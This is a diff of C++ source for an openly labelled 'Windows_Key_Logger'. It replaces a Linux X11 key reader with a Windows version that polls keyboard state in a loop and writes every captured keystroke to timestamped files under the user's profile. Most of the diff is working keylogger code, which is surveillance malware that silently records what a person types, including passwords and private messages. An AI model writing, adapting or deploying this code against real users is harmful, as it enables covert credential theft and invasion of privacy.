@@ -1,5 +1,7 @@
 /*
-  
+Windows_Key_Logger https://github.com/Androsh7/Windows_Key_Logger
+by Androsh7
+
 MIT License
 
 Copyright (c) 2024 Androsh7
@@ -21,139 +23,150 @@ AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
-
 */
 
-#include <X11/Xlib.h>
-#include <X11/Xutil.h>
-#include <X11/keysym.h>
-#include <stdio.h>
-#include <unistd.h>
-#include <stdint.h>
 #include <iostream>
+#include <Windows.h>
+#include <winuser.h>
+#include <stdio.h>
+#include <fstream>
+#include <string>
+#include <Lmcons.h>
+#include <array>
+#include <stdexcept>
+#include <memory>
+using namespace std;
 
-#define charlistlen 47
-const char charkeylist[charlistlen] =    { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', ';', '=', ',', '-', '.', '/', '`' ,'[', '\\', ']', '\''};
-const char altcharkeylist[charlistlen] = { ')', '!', '@', '#', '$', '%', '^', '&', '*', '(', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', ':', '+', '<', '_', '>', '?', '~' , '{', '|' , '}', '\"'};
+#define winlen 51
 
-char caps_char(char find_char) {
-        for (int i = 0; i < charlistlen; i++) {
-                if (find_char == charkeylist[i]) {
-                        return altcharkeylist[i];
-                }
-        }
-        return '\0';
+// windows key codes
+const char winkeylist[] = { '\b', '\t', '\n', ' ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', ';', '=', ',', '-', '.', '/', '`' ,'[', '\\', ']', '\''};
+const char altkeylist[] = { '\b', '\t', '\n', ' ', ')', '!', '@', '#', '$', '%', '^', '&', '*', '(', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', ':', '+', '<', '_', '>', '?', '~' , '{', '|' , '}', '\"'};
+const int wincodelist[] = { 8,    9,    13,   32,  48,  49,  50,  51,  52,  53,  54,  55,  56,  57,  65,  66,  67,  68,  69,  70,  71,  72,  73,  74,  75,  76,  77,  78,  79,  80,  81,  82,  83,  84,  85,  86,  87,  88,  89,  90,  186, 187, 188, 189, 190, 191, 192, 219, 220, 221, 222 };
+
+// executes a console command and returns it's output
+string exec(string incmd) {
+	const char* cmd = incmd.c_str();
+	array<char, 128> buffer;
+	string result;
+	unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
+	if (!pipe) {
+		throw runtime_error("popen() failed!");
+	}
+	while (fgets(buffer.data(), static_cast<int>(buffer.size()), pipe.get()) != nullptr) {
+		result += buffer.data();
+	}
+	return result;
 }
 
-int get_key_state(char* keys, char* prev_keys, int key_num) {
-        int byteIndex = key_num / 8;
-        int bitIndex = key_num % 8;
-        bool current_state = keys[byteIndex] & (1 << bitIndex);
-        bool prev_state = prev_keys[byteIndex] & (1 << bitIndex);
-        if (current_state && !prev_state) return 1; // key pressed
-        if (current_state && prev_state) return 2; // key held
-        if (!current_state && prev_state) return 3; // key released
-        return 0; // key not pressed
+char getwinkey(int wincode, bool alt = false) {
+	for (int i = 0; i < winlen; i++) {
+		if (wincode == wincodelist[i]) {
+			if (alt) return altkeylist[i];
+			else return winkeylist[i];
+		}
+	}
+	return NULL;
 }
 
-int main() {
-        Display *display = XOpenDisplay(NULL);
-        if (display == NULL) {
-                fprintf(stderr, "Unable to open display\n");
-                return 1;
-        }
+string getUsername() {
+	char username[UNLEN + 1];
+	DWORD username_len = UNLEN + 1;
 
-        char raw_keys[32];
-        char prev_raw_keys[32];
+	if (GetUserNameA(username, &username_len)) {
+		return string(username);
+	}
+	else {
+		std::cerr << "Error getting username.\n";
+		return "ERROR";
+	}
+}
 
-        int min_keycode, max_keycode, keysyms;
+string getTimestamp() {
+	string outstr = "";
+	SYSTEMTIME str_t;
+	GetSystemTime(&str_t);
+	outstr += to_string(str_t.wYear);
+	outstr += to_string(str_t.wMonth);
+	outstr += to_string(str_t.wDay);
+	outstr += "-";
+	outstr += to_string(str_t.wMinute);
+	outstr += to_string(str_t.wSecond);
+	return outstr;
+}
 
-        bool shift = false;
-        bool caps = false;
+int main()
+{
+	// get the path for the users document folder
+	
+	
+	string logpath;
+	string homepath = exec("echo|set /p=\"%USERPROFILE%\"");
+	exec("mkdir " + homepath + "\\LogData");
+	logpath = homepath + "\\LogData\\" + getTimestamp() + ".txt";
 
-        // Gets mapping of keycodes
-        XDisplayKeycodes(display, &min_keycode, &max_keycode);
-        KeySym *mapping = XGetKeyboardMapping(display, min_keycode, max_keycode - min_keycode + 1, &keysyms);
+	int temp;
+	BYTE arr[256];
+	BYTE arr_prev[256];
+	bool shift = false;
 
-        while (True)
-        {
-                // read key states
-                XQueryKeymap(display, raw_keys);
+	string outstring = "";
+	int repetitions = 0;
 
-                // check L_shift status
-                if (get_key_state(raw_keys, prev_raw_keys, 50) == 1) {
-                        printf("L_Shift Pressed\n");
-                        shift = true;
-                } else if (shift && get_key_state(raw_keys, prev_raw_keys, 50) == 0) {
-                        shift = false;
-                }
-                // check R_shift status
-                if (get_key_state(raw_keys, prev_raw_keys, 62) == 1) {
-                        printf("R_Shift Pressed\n");
-                        shift = true;
-                } else if (shift && get_key_state(raw_keys, prev_raw_keys, 62) == 0) {
-                        shift = false;
-                }
-                // check caps status
-                if (get_key_state(raw_keys, prev_raw_keys, 66) == 1) {
-                        printf("CAPS LOCK\n");
-                        caps = !caps;
-                }
+	while (1)
+	{
+		// get status of shift key
+		if (GetKeyState(VK_SHIFT) <= -127) {
+			//cout << "SHIFT = TRUE" << endl;
+			shift = true;
+		}
+		else shift = false;
 
-                bool capitalization = caps ^ shift; // capitalization
+		// gets current key presses and writes them to outstring
+		memset(arr, 0, sizeof(256));
+		GetKeyState(0);
+		if (GetKeyboardState(arr))
+		{
+			for (int i = 0; i < 256; i++)
+			{
+				temp = (int)arr[i];
+				temp >>= 7;
+				if (temp == 1 && arr[i] != arr_prev[i] && getwinkey(i) != NULL) {
+					if ((shift xor (int)arr[VK_CAPITAL])) {
+						outstring += getwinkey(i, true);
+						//cout << getwinkey(i, true);
+					}
+					else {
+						outstring += getwinkey(i, false);
+						//cout << getwinkey(i, false);
+					}
+				}
+			}
+			Sleep(40);
+		}
+		for (int i = 0; i < 256; i++) {
+			arr_prev[i] = arr[i];
+		}
 
-                
-                // writes key states to keymap
-                for (int i = 0; i < 256; i++) {
-                        int byteIndex = i / 8;
-                        int bitIndex = i % 8;
+		// writes the logs to a file
+		if (!(repetitions % 1500)) {
+			if (outstring != "" || repetitions == 0) {
+				ofstream fout(logpath, std::ios::app);
+				if (fout.is_open()) {
+					cout << "WROTE " << outstring.size() << " BYTES TO " << logpath << endl;
+					if (repetitions == 0) {
+						fout << "\n" << getTimestamp() << "\n";
+					}
+					fout << outstring;
+					outstring = "";
+					fout.close();
+				}
+				else {
+					cerr << "Could not open " << logpath << endl;
+				}
+			}
+		}
+		repetitions = (repetitions + 1) % 7500;
+	}
 
-                        // skip checking L_shift(50), R_shift(62), and caps lock(66)
-                        if (i == 66 || i == 50 || i == 62) { continue; }
-                        
-                        // Key press
-                        if (raw_keys[byteIndex] & (1 << bitIndex) && !(prev_raw_keys[byteIndex] & (1 << bitIndex))) {
-
-                                for (int j = 0; j < keysyms; j++) {
-                                        KeySym keypress = mapping[(i - min_keycode) * keysyms + j];
-
-                                        if (keypress != NoSymbol) {
-                                                std::string key_str = XKeysymToString(keypress);
-
-                                                // gets capitalized chars
-                                                if (key_str.length() == 1 && capitalization) {
-                                                        char temp_char = caps_char(key_str[0]);
-                                                        key_str = "";
-                                                        key_str += temp_char;
-                                                }
-
-                                                printf("%s", key_str);
-                                                                                                
-                                                // Important to flush to write in a file
-                                                // Can alternatively disable buffering in stdout
-                                                fflush(stdout);
-                                                break;
-                                        }  
-                                }
-                        }
-
-                        // Key held
-                        else if (raw_keys[byteIndex] & (1 << bitIndex) && (prev_raw_keys[byteIndex] & (1 << bitIndex))) {
-
-                        }
-
-                        // Key Release
-                        else if (raw_keys[byteIndex] & (1 << bitIndex) && !(prev_raw_keys[byteIndex] & (1 << bitIndex))) {
-
-                        }
-                }
-                for (int i = 0; i < 32; i++) {
-                        prev_raw_keys[i] = raw_keys[i];
-                        raw_keys[i] = '\0';
-                }
-
-        }
-        XFree(mapping);
-        XCloseDisplay(display);
-        return 0;
 }
